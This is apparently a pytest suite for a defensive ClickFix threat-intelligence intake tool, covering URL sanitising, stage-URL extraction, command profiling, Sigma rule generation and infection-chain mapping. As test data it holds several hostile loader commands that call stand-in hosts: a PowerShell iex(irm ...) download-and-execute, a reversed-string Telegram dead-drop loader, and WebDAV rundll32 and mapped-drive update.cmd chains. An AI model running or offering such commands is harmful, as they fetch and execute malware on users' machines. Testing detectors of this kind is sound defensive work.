from __future__ import annotations

import importlib.util
import json
import sys

import pytest
from pathlib import Path


MODULE_PATH = Path(__file__).resolve().parents[1] / "clickfix" / "clickfix_daily_intake.py"
SPEC = importlib.util.spec_from_file_location("clickfix_daily_intake", MODULE_PATH)
assert SPEC and SPEC.loader
target = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = target
SPEC.loader.exec_module(target)


def _case(
    domain: str,
    source: str,
    source_id: str,
    observed_at: str,
):
    return target.SelectedCase(
        case_id=target._case_id("2026-07-30", source, source_id),
        domain=domain,
        observed_at=observed_at,
        source=source,
        source_id=source_id,
        source_url="https://example.test/",
        tags=("ClickFix",),
        reported_malware="未確認",
        confidence=100,
    )


def test_sanitize_url_removes_query_fragment_and_telegram_path() -> None:
    normal = target.sanitize_url("https://example.test/a?token=secret&sid=1#fragment")
    telegram = target.sanitize_url("https://t.me/+privateInvite")

    assert normal["sanitized"] == "https://example.test/a"
    assert normal["query_names"] == ["sid", "token"]
    assert len(normal["query_sha256"]) == 64
    assert normal["fragment_present"] is True
    assert telegram["sanitized"] == "https://t.me/<redacted>"
    assert len(telegram["path_sha256"]) == 64


def test_extract_stage_urls_recovers_reversed_telegram_and_webdav() -> None:
    command = (
        "powershell $v=-join('0ETN3AmHI8hIMsWY+/em.t//:sptth'[-1..-30]);"
        "$j=irm($v); pushd \\\\files.example.test@SSL\\abc & "
        "rundll32 payload,#1"
    )

    result = target.extract_stage_urls(command)

    assert "https://t.me/+YWsMIh8IHmA3NTE0" in result
    assert "https://files.example.test/abc" in result


def test_extract_stage_urls_expands_webdav_update_script() -> None:
    command = 'cmd /c net use Z: http://203.0.113.7/webdav /persistent:no && "Z:\\update.cmd" & net use Z: /delete'

    result = target.extract_stage_urls(command)

    assert result == [
        "http://203.0.113.7/webdav",
        "http://203.0.113.7/webdav/update.cmd",
    ]


def test_command_profiles_distinguish_major_chains() -> None:
    telegram = target.command_profile(
        "powershell $v=-join('0ETN3AmHI8hIMsWY+/em.t//:sptth'[-1..-30]);"
        "$j=irm($v);if($j-match'_description'){$h=irm('https://'+$V+'/l.dat');iex $h}"
    )
    webdav = target.command_profile(
        'conhost --headless -- cmd /v:on /c "pushd \\\\host.test@SSL\\x & rundll32 payload,#1"'
    )
    mapped = target.command_profile('cmd /c net use Z: http://host.test/webdav && "Z:\\update.cmd"')

    assert telegram["pattern"] == "telegram_dead_drop_powershell"
    assert telegram["processes"] == ["powershell.exe"]
    assert webdav["pattern"] == "webdav_rundll32"
    assert webdav["processes"] == ["conhost.exe", "cmd.exe", "rundll32.exe"]
    assert mapped["pattern"] == "mapped_webdav_command"


def test_command_profile_rejects_reverse_tme_substring_without_reverse_syntax() -> None:
    profile = target.command_profile(
        "powershell $name='em.t'; Invoke-Expression $payload"
    )
    assert profile["pattern"] == "shell_execution"


def test_selection_prioritizes_explicit_and_today_then_backfills() -> None:
    carson = _case(
        "tbhadvisors.com",
        "ClickFix Hunter",
        "carson",
        "2026-07-27T22:22:02Z",
    )
    threatfox = [
        _case("newest.test", "ThreatFox", "2", "2026-07-30 05:00:00 UTC"),
        _case("older.test", "ThreatFox", "1", "2026-07-30 04:00:00 UTC"),
    ]
    monitor = [
        _case(
            "monitor.test",
            "ClickFix Campaign Monitor",
            "m1",
            "2026-07-29T00:00:00Z",
        )
    ]

    selected = target.select_cases(
        analysis_date="2026-07-30",
        threatfox_clickfix=threatfox,
        threatfox_clearfake=[],
        clickfix_pro=monitor,
        carson=carson,
        limit=4,
    )

    assert [item.domain for item in selected] == [
        "tbhadvisors.com",
        "newest.test",
        "older.test",
        "monitor.test",
    ]


def test_selection_deduplicates_domains() -> None:
    carson = _case(
        "same.test",
        "ClickFix Hunter",
        "carson",
        "2026-07-27T00:00:00Z",
    )
    duplicate = _case(
        "same.test",
        "ThreatFox",
        "tf1",
        "2026-07-30 00:00:00 UTC",
    )
    monitor = _case(
        "other.test",
        "ClickFix Campaign Monitor",
        "m1",
        "2026-07-29T00:00:00Z",
    )

    selected = target.select_cases(
        analysis_date="2026-07-30",
        threatfox_clickfix=[duplicate],
        threatfox_clearfake=[],
        clickfix_pro=[monitor],
        carson=carson,
        limit=2,
    )

    assert [item.domain for item in selected] == ["same.test", "other.test"]


def test_threatfox_parser_keeps_only_requested_day(tmp_path: Path) -> None:
    path = tmp_path / "threatfox.json"
    path.write_text(
        json.dumps(
            {
                "query_status": "ok",
                "data": [
                    {
                        "id": "1",
                        "ioc": "today.test",
                        "first_seen": "2026-07-30 01:00:00 UTC",
                        "tags": ["ClearFake"],
                        "malware_printable": "ClearFake",
                        "confidence_level": 100,
                    },
                    {
                        "id": "2",
                        "ioc": "yesterday.test",
                        "first_seen": "2026-07-29 01:00:00 UTC",
                        "tags": ["ClearFake"],
                        "malware_printable": "ClearFake",
                        "confidence_level": 100,
                    },
                ],
            }
        ),
        encoding="utf-8",
    )

    cases = target.parse_threatfox(path, "clearfake", "2026-07-30")

    assert len(cases) == 1
    assert cases[0].domain == "today.test"
    assert "clearfake" in cases[0].tags


def test_ioc_list_excludes_dual_use_dead_drop() -> None:
    iocs = {
        "indicators": [
            target._indicator(
                "domain",
                "malicious.test",
                "clickfix_landing_or_payload_delivery",
                "confirmed_provider_report",
                "test",
            ),
            target._indicator(
                "url",
                "https://t.me/<redacted>",
                "context_only_dead_drop_resolver",
                "confirmed_in_clipboard_command",
                "test",
            ),
        ]
    }

    rendered = target.render_ioc_list(iocs)

    assert "malicious.test" in rendered
    assert "t.me" not in rendered


def test_sigma_uses_case_stable_unique_ids() -> None:
    item = _case(
        "example.test",
        "ThreatFox",
        "1",
        "2026-07-30 01:00:00 UTC",
    )
    profile = target.command_profile("powershell -w h -c \"iex(irm 'https://stage.test/a')\"")

    first = target.sigma_documents(item, profile)
    second = target.sigma_documents(item, profile)

    assert [document["id"] for document in first] == [document["id"] for document in second]
    assert len({document["id"] for document in first}) == len(first)
    assert first[1]["logsource"]["category"] == "process_creation"


def test_public_observation_drops_private_marker_and_asset_urls() -> None:
    observation = {
        "landing": [
            {
                "hops": [
                    {
                        "body_retained_private": True,
                        "text_analysis": {
                            "referenced_urls": [
                                {"sanitized": "https://cdn.example/a.js"},
                                {"sanitized": "https://cdn.example/b.css"},
                            ],
                            "candidate_commands": [
                                {
                                    "command_sha256": "a" * 64,
                                    "private_command": "secret",
                                }
                            ],
                        },
                    }
                ]
            }
        ],
        "stages": [],
    }

    public = target.public_observation(observation)
    hop = public["landing"][0]["hops"][0]

    assert "body_retained_private" not in hop
    assert "referenced_urls" not in hop["text_analysis"]
    assert hop["text_analysis"]["referenced_url_count"] == 2
    assert "private_command" not in hop["text_analysis"]["candidate_commands"][0]
    assert "referenced_urls" not in target.observation_summary(observation)


class _FakeTlsSocket:
    def getpeercert(self, binary_form: bool = False) -> bytes:
        assert binary_form is True
        return b"not-a-real-der-certificate"


class _FakeHttpsConnection:
    sock = _FakeTlsSocket()


def test_tls_certificate_summary_keeps_fingerprint_on_parse_failure() -> None:
    result = target._tls_certificate_summary(_FakeHttpsConnection())

    assert result is not None
    assert len(result["sha256"]) == 64
    assert result["der_size"] == len(b"not-a-real-der-certificate")
    assert result["parsed"] is False


def test_observation_summary_deduplicates_tls_certificates() -> None:
    certificate = {"sha256": "b" * 64, "issuer": "CN=Test"}
    observation = {
        "landing": [
            {
                "hops": [
                    {"status": "ok", "http_status": 200, "tls_certificate": certificate},
                    {"status": "ok", "http_status": 200, "tls_certificate": certificate},
                ]
            }
        ],
        "stages": [],
    }

    summary = target.observation_summary(observation)

    assert summary["tls_certificates"] == [certificate]


def test_browser_observation_captures_command_without_public_raw_value() -> None:
    item = _case(
        "browser.test",
        "ThreatFox",
        "browser-1",
        "2026-07-30 01:00:00 UTC",
    )
    raw = {
        "schema_version": 1,
        "case_id": item.case_id,
        "domain": item.domain,
        "observed_at_utc": "2026-07-30T01:05:00Z",
        "status": "ok",
        "policy": {
            "javascript_executed": True,
            "clipboard_intercepted": True,
            "native_clipboard_write_suppressed": True,
            "command_executed": False,
            "command_pasted": False,
            "credentials_sent": False,
            "form_submitted": False,
            "payload_opened": False,
        },
        "page": {
            "title": "Verification",
            "final_url": "https://browser.test/a?token=secret",
            "lure_markers": ["Verify", "Clipboard"],
        },
        "clipboard_events": [
            {
                "api": "navigator.clipboard.writeText",
                "private_value": "powershell -w h -c \"iex(irm 'https://stage.test/a')\"",
            }
        ],
    }

    browser = target.normalize_browser_observation(raw, item)
    observation = {"landing": [], "stages": [], "browser_observation": browser}
    summary = target.observation_summary(observation)
    public = target.public_observation(observation)

    assert summary["browser_attempted"] is True
    assert summary["browser_javascript_executed"] is True
    assert summary["browser_clipboard_intercepted"] is True
    assert summary["browser_clipboard_events"] == 1
    assert summary["candidate_commands_live"][0]["pattern"] == "powershell_download_execute"
    assert summary["candidate_commands_live"][0]["stage_urls"] == ["https://stage.test/a"]
    assert browser["page"]["final_url"]["sanitized"] == "https://browser.test/a"
    assert "private_value" not in public["browser_observation"]["clipboard_events"][0]


def test_browser_observation_rejects_executed_command() -> None:
    item = _case(
        "browser.test",
        "ThreatFox",
        "browser-2",
        "2026-07-30 01:00:00 UTC",
    )
    raw = {
        "schema_version": 1,
        "case_id": item.case_id,
        "domain": item.domain,
        "observed_at_utc": "2026-07-30T01:05:00Z",
        "status": "ok",
        "policy": {"command_executed": True},
        "page": {},
        "clipboard_events": [],
    }

    with pytest.raises(ValueError, match="禁止されたブラウザ操作"):
        target.normalize_browser_observation(raw, item)


def test_infection_chain_records_supported_stages_and_stop_point() -> None:
    raw_command = "powershell -w h -c \"iex(irm 'https://stage.test/a')\""
    item = target.SelectedCase(
        case_id=target._case_id("2026-07-30", "ThreatFox", "chain-1"),
        domain="chain.test",
        observed_at="2026-07-30 01:00:00 UTC",
        source="ThreatFox",
        source_id="chain-1",
        source_url="https://example.test/",
        tags=("ClickFix",),
        reported_malware="未確認",
        confidence=100,
        raw_command=raw_command,
    )
    observation = {
        "landing": [
            {
                "hops": [
                    {
                        "status": "ok",
                        "http_status": 200,
                        "text_analysis": {
                            "clipboard_api_observed": True,
                            "lure_markers": ["verify"],
                            "candidate_commands": [],
                        },
                    }
                ]
            }
        ],
        "stages": [],
    }
    summary = target.observation_summary(observation)
    command = target.command_profile(raw_command)
    command["stage_urls"] = ["https://stage.test/a"]

    chain = target.build_infection_chain(item, summary, command)
    by_phase = {stage["phase_id"]: stage for stage in chain["stages"]}
    rendered = target.render_infection_chain(chain)

    assert by_phase["CF-01"]["status"] == "observed"
    assert by_phase["CF-03"]["status"] == "provider_reported"
    assert by_phase["CF-04"]["status"] == "not_observed"
    assert "flowchart LR" in rendered
    assert "CF-03" in rendered
